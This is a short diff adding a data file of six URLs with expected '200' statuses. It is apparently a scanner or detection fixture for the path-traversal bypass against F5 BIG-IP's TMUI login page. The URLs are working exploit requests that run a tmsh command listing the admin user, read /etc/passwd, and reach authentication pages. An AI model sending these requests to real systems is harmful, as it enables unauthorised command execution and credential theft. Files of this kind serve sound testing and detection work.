@@ -1,0 +1,6 @@
+"http://1.1.1.1/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin","200"
+"http://1.1.1.1/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd","200"
+"http://1.1.1.1/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp","200"
+"http://1.1.1.1/tmui/login.jsp/..;/tmui/util/getTabSet.jsp","200"
+"http://1.1.1.1/tmui/login.jsp/..;/tmui/system/user/authproperties.jsp","200"
+"http://1.1.1.1/tmui/login.jsp/..;/tmui/locallb","200"
